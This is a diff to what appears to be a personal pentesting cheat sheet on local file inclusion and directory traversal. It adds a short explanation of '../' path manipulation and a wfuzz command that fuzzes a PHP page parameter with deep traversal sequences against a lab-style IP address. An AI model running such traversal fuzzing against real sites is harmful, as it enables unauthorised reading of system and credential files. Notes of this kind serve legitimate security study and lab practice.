@@ -1,3 +1,6 @@
+# File Inclusion And Directory Traversal
+File Inclusion facilitation stems from Directory traversal vulnerabities. Directory traversal or path path traversal are identifiable by an ability to manipulate file paths with cli-esque: `../` or `..\` characters to change directory from the webpage beeing attacked.
+
 ## Traversal encoding:
 Remember this is a guide to ideas of how to encode lfi, encoding payloads on the fly not from here.
 ```
@@ -55,7 +58,10 @@ Remember this is a guide to ideas of how to encode lfi, encoding payloads on the
 ?conf={payload}
 ```
 
-## wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
+## Fuzz for files
+```bash
+wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
+```
 
 ## Script LFI starting 
 ON TODO LIST
